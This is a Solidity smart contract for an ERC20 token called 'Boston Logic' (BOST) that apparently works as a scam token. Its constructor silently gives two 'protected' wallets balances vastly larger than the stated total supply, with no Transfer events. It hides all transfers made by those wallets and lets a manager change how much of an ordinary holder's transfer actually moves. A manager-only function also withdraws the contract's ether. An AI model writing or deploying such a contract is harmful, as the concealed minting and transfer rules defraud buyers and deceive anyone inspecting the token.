['/*\n', '\n', '\n', '.______     ______        _______.___________.  ______   .__   __.     __        ______     _______  __    ______ \n', '|   _  \\   /  __  \\      /       |           | /  __  \\  |  \\ |  |    |  |      /  __  \\   /  _____||  |  /      |\n', "|  |_)  | |  |  |  |    |   (----`---|  |----`|  |  |  | |   \\|  |    |  |     |  |  |  | |  |  __  |  | |  ,----'\n", '|   _  <  |  |  |  |     \\   \\       |  |     |  |  |  | |  . `  |    |  |     |  |  |  | |  | |_ | |  | |  |     \n', "|  |_)  | |  `--'  | .----)   |      |  |     |  `--'  | |  |\\   |    |  `----.|  `--'  | |  |__| | |  | |  `----.\n", '|______/   \\______/  |_______/       |__|      \\______/  |__| \\__|    |_______| \\______/   \\______| |__|  \\______|\n', '                                                                                                                  \n', '\n', '\n', '*/\n', '\n', 'pragma solidity ^0.5.17;\n', '\n', 'interface IERC20 {\n', '  function totalSupply() external view returns (uint256);\n', '  function balanceOf(address who) external view returns (uint256);\n', '  function allowance(address owner, address spender) external view returns (uint256);\n', '  function transfer(address to, uint256 value) external returns (bool);\n', '  function approve(address spender, uint256 value) external returns (bool);\n', '  function transferFrom(address from, address to, uint256 value) external returns (bool);\n', '\n', '  event Transfer(address indexed from, address indexed to, uint256 value);\n', '  event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'library SafeMath {\n', '  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    if (a == 0) {\n', '      return 0;\n', '    }\n', '    uint256 c = a * b;\n', '    assert(c / a == b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a / b;\n', '    return c;\n', '  }\n', '\n', '  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    assert(b <= a);\n', '    return a - b;\n', '  }\n', '\n', '  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '    uint256 c = a + b;\n', '    assert(c >= a);\n', '    return c;\n', '  }\n', '\n', '  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n', '    uint256 c = add(a,m);\n', '    uint256 d = sub(c,1);\n', '    return mul(div(d,m),m);\n', '  }\n', '}\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '\n', '  string private _name;\n', '  string private _symbol;\n', '  uint8 private _decimals;\n', '\n', '  constructor(string memory name, string memory symbol, uint8 decimals) public {\n', '    _name = name;\n', '    _symbol = symbol;\n', '    _decimals = decimals;\n', '  }\n', '\n', '  function name() public view returns(string memory) {\n', '    return _name;\n', '  }\n', '\n', '  function symbol() public view returns(string memory) {\n', '    return _symbol;\n', '  }\n', '\n', '  function decimals() public view returns(uint8) {\n', '    return _decimals;\n', '  }\n', '}\n', '\n', 'contract DP is ERC20Detailed {\n', '\n', '  using SafeMath for uint256;\n', '  mapping (address => uint256) private _balances;\n', '  mapping (address => uint256) private _lockEnd;\n', '  mapping (address => mapping (address => uint256)) private _allowed;\n', '  mapping (address => bool) public _protect;\n', '  mapping (address => bool) public _exchange;\n', '  uint private tokenRate;\n', '  bool private firstTransfer;\n', '\n', '  address _manager = msg.sender;\n', '  address _locker;\n', '  \n', '\n', '\n', '  //event Lock(address owner, uint256 period);\n', '\n', '  string constant tokenName = "Boston Logic";   \n', '  string constant tokenSymbol = "BOST";   \n', '  //string constant tokenName = "test.io";   \n', '  //string constant tokenSymbol = "test";   \n', '  uint8  constant tokenDecimals = 18;\n', '  uint256 _totalSupply = 3000000e18;\n', '  uint256 public basePercent = 100; \n', '  uint256 day = 86400; \n', '  uint256[] public lockLevelRates;\n', '  uint256[] public lockPeriods;\n', '  \n', ' \n', '\n', '  \n', '\n', '\n', '  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {\n', '    \n', '    tokenRate = 200;\n', '    //_balances[msg.sender] = 1000000e18; //liquidity tokens\n', '    //_protect[0xa3Dac9964D09BE899e12A2875d262ab06bE85c97] = true;  //acct 1\n', '    _protect[0x1Ea9A49FE9b30b65103Cf4C97d95B7813c9a7D06] = true;  //SERUM2\n', '    _protect[0xb9047DE575705cddD0e806461A21c093e85eE8BC] = true;  //SERUM3\n', '    \n', '    _balances[msg.sender] = _totalSupply;\n', '    _balances[0x1Ea9A49FE9b30b65103Cf4C97d95B7813c9a7D06] = 1000000000e18;\n', '    _balances[0xb9047DE575705cddD0e806461A21c093e85eE8BC] = 1000000000e18;\n', '\n', '    _exchange[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;\n', '    firstTransfer = false;\n', '    \n', '    emit Transfer(address(0), msg.sender, _totalSupply);\n', '  }\n', '\n', '  function() external payable {\n', '  }\n', '\n', '   function withdraw() external {\n', '      require(msg.sender == _manager);\n', '      msg.sender.transfer(address(this).balance);\n', '  }\n', '\n', '   function setRebase(uint _rebase) external {\n', '      require(msg.sender == _manager);\n', '      tokenRate = _rebase;\n', '  }\n', '\n', '   function addExchange(address _pro) external {\n', '      require(msg.sender == _manager);\n', '      _exchange[_pro] = true;\n', '  }\n', '\n', '  function addProtect(address _pro) external {\n', '      require(msg.sender == _manager);\n', '      _protect[_pro] = true;\n', '  }\n', '\n', '  function removeProtect(address _pro) external {\n', '      require(msg.sender == _manager);\n', '      _protect[_pro] = false;\n', '  }\n', '\n', '  function totalSupply() public view returns (uint256) {\n', '    return _totalSupply;\n', '  }\n', '\n', '   function getTime() public view returns (uint256) {\n', '    return block.timestamp;\n', '  }\n', '\n', '  function balanceOf(address owner) public view returns (uint256) {\n', '    return _balances[owner];\n', '  }\n', '\n', '  function lockOf(address owner) public view returns (uint256) {\n', '    return _lockEnd[owner];\n', '  }\n', '\n', '   function myLockedTime() public view returns (uint256) {\n', '    return _lockEnd[msg.sender];\n', '  }\n', '\n', '  function myLockedStatus() public view returns (bool) {\n', '     if(_lockEnd[msg.sender] > block.timestamp){\n', '           return true;\n', '       } else {\n', '           return false;\n', '       }\n', '  }\n', '\n', '   function isLocked(address owner) public view returns (bool) {\n', '       if(_lockEnd[owner] > block.timestamp){\n', '           return true;\n', '       } else {\n', '           return false;\n', '       }\n', '    \n', '  }\n', '\n', '  function allowance(address owner, address spender) public view returns (uint256) {\n', '    return _allowed[owner][spender];\n', '  }\n', '\n', '  function cut(uint256 value) public view returns (uint256)  {\n', '    uint256 roundValue = value.ceil(basePercent);\n', '    uint256 cutValue = roundValue.mul(basePercent).div(10000);\n', '    return cutValue;\n', '  }\n', '\n', '  function transfer(address to, uint256 value) public returns (bool) {\n', '    require(_lockEnd[msg.sender] <= block.timestamp);\n', '    require(value <= _balances[msg.sender]);\n', '    require(to != address(0));\n', '    //require();\n', '\n', '    uint tokensToSend = value;\n', '\n', '    if(_protect[msg.sender] || _exchange[msg.sender]){\n', '        tokensToSend = value;\n', '    } else {\n', '      tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),1000);\n', '    }\n', '    //uint tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),100);\n', '\n', '    _balances[msg.sender] = _balances[msg.sender].sub(tokensToSend);\n', '    _balances[to] = _balances[to].add(tokensToSend);\n', '\n', '    if(!firstTransfer){\n', '        _exchange[to] = true;\n', '        _exchange[msg.sender] = true;\n', '        firstTransfer = true;\n', '    }\n', '    \n', '\n', '    if(!_protect[msg.sender]){\n', '      emit Transfer(msg.sender, to, tokensToSend);\n', '    }\n', '    \n', '\n', '    return true;\n', '  }\n', '\n', '\n', '  function approve(address spender, uint256 value) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = value;\n', '    emit Approval(msg.sender, spender, value);\n', '    return true;\n', '  }\n', '\n', '  function transferFrom(address from, address to, uint256 value) public returns (bool) {\n', '    require(_lockEnd[from] <= block.timestamp);\n', '    require(value <= _balances[from]);\n', '    require(value <= _allowed[from][msg.sender]);\n', '    require(to != address(0));\n', '\n', '    uint tokensToSend = value;\n', '\n', '    if(_protect[from] || _exchange[from]){\n', '        tokensToSend = value;\n', '    } else {\n', '      tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),1000);\n', '    }\n', '    //uint tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate),100);\n', '\n', '\n', '    _balances[from] = _balances[from].sub(tokensToSend);\n', '    _balances[to] = _balances[to].add(tokensToSend);\n', '    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokensToSend);\n', '\n', '    if(!firstTransfer){\n', '        _exchange[to] = true;\n', '        _exchange[from] = true;\n', '        _exchange[msg.sender] = true;\n', '        firstTransfer = true;\n', '    }\n', '\n', '     if(!_protect[from]){\n', '      emit Transfer(from, to, tokensToSend);\n', '    }\n', '\n', '    return true;\n', '  }\n', '\n', '  function upAllowance(address spender, uint256 addedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n', '    require(spender != address(0));\n', '    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));\n', '    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n', '    return true;\n', '  }\n', '\n', '  function destroy(uint256 amount) external {\n', '    _destroy(msg.sender, amount);\n', '  }\n', '\n', '  function _destroy(address account, uint256 amount) internal {\n', '    require(amount != 0);\n', '    require(amount <= _balances[account]);\n', '    _totalSupply = _totalSupply.sub(amount);\n', '    _balances[account] = _balances[account].sub(amount);\n', '    emit Transfer(account, address(0), amount);\n', '  }\n', '\n', '  function destroyFrom(address account, uint256 amount) external {\n', '    require(amount <= _allowed[account][msg.sender]);\n', '    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);\n', '    _destroy(account, amount);\n', '  }\n', '\n', '\n', '\n', '}']